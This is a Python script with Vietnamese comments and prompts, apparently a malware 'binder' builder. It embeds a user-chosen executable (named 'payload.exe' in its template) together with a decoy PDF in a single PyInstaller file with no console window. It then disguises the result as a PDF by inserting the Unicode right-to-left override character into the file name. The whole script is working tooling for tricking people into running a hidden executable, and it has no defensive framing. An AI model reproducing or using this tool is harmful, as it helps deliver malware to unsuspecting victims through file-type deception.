import os
import subprocess
import shutil

def create_binder(exe_path, pdf_path, icon_path=None, output_name="Document"):
    # 1. Kiểm tra file đầu vào
    if not os.path.exists(exe_path) or not os.path.exists(pdf_path):
        print("[-] Lỗi: Không tìm thấy file EXE hoặc PDF!")
        return

    exe_filename = os.path.basename(exe_path)
    pdf_filename = os.path.basename(pdf_path)

    print(f"[*] Đang chuẩn bị Binder cho: {exe_filename} và {pdf_filename}...")

    # 2. Đọc và chỉnh sửa stub_template.py
    with open("stub_template.py", "r", encoding="utf-8") as f:
        content = f.read()

    # Thay thế tên file trong mã nguồn
    content = content.replace('PDF_FILE = "document.pdf"', f'PDF_FILE = "{pdf_filename}"')
    content = content.replace('EXE_FILE = "payload.exe"', f'EXE_FILE = "{exe_filename}"')

    with open("temp_stub.py", "w", encoding="utf-8") as f:
        f.write(content)

    # 3. Xây dựng lệnh PyInstaller
    # --onefile: Đóng gói 1 file duy nhất
    # --noconsole: Không hiện cửa sổ đen CMD khi chạy
    # --add-data: Nhúng file vào bên trong EXE
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        f'--add-data={exe_path};.',
        f'--add-data={pdf_path};.',
        "--clean",
        "temp_stub.py"
    ]

    if icon_path and os.path.exists(icon_path):
        cmd.append(f'--icon={icon_path}')

    print("[*] Đang biên dịch file (Quá trình này có thể mất vài phút)...")
    
    try:
        subprocess.run(cmd, check=True)
        
        # 4. Dọn dẹp và đổi tên file kết quả
        dist_path = os.path.join("dist", "temp_stub.exe")
        
        # Kỹ thuật RLO: làm cho file trông giống .pdf
        # Chèn ký tự \u202e trước chữ "fdp" (pdf viết ngược)
        rlo_name = f"{output_name}\u202efdp.exe"
        final_path = os.path.join(".", rlo_name)

        if os.path.exists(dist_path):
            if os.path.exists(final_path):
                os.remove(final_path)
            shutil.move(dist_path, final_path)
            print(f"[+] THÀNH CÔNG! File đã được tạo tại: {rlo_name}")
        
        # Xóa các file rác
        if os.path.exists("temp_stub.py"): os.remove("temp_stub.py")
        if os.path.exists("temp_stub.spec"): os.remove("temp_stub.spec")
        # if os.path.exists("build"): shutil.rmtree("build")
        # if os.path.exists("dist"): shutil.rmtree("dist")

    except subprocess.CalledProcessError as e:
        print(f"[-] Lỗi trong quá trình biên dịch: {e}")

if __name__ == "__main__":
    print("--- 🛠️ AI BINDER TOOL 🛠️ ---")
    exe = input("Nhập đường dẫn file .EXE: ").strip('"')
    pdf = input("Nhập đường dẫn file .PDF: ").strip('"')
    icon = input("Nhập đường dẫn file .ICO (để trống nếu không có): ").strip('"')
    name = input("Nhập tên file muốn đặt (VD: Thong_Bao): ")
    
    create_binder(exe, pdf, icon, name)
